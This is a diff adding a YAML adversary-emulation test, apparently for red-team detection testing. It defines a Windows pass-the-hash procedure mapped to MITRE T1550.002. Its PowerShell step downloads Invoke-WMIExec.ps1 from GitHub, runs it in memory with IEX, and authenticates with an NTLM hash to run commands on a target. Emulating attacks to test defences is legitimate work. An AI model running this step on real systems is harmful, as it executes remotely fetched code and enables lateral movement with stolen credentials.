@@ -1,0 +1,40 @@
+api_version: "2.0"
+name: Invoke-WMIExec Pass the Hash
+description: |-
+    Use Invoke-WMIExec to Pass the Hash
+    Note: must dump hashes first
+    [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
+args:
+    - name: ntlm
+      type: string
+      default: cc36cf7a8514893efccd3324464tkg1a
+    - name: user_name
+      type: string
+      default: Administrator
+    - name: command
+      type: string
+      default: hostname
+    - name: target
+      type: string
+      default: $env:COMPUTERNAME
+uuid: f8757545-b00a-4e4e-8cfb-8cfb961ee713
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0008: Lateral Movement'
+    techniques:
+        - 'T1550: Use Alternate Authentication Material'
+    subtechniques:
+        - 'T1550.002: Pass the Hash'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: invoke-wmiexec-pass-the-hash
+      inline: |-
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target {{.Args.target}} -Username {{.Args.user_name}} -Hash {{.Args.ntlm}} -Command {{.Args.command}}
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
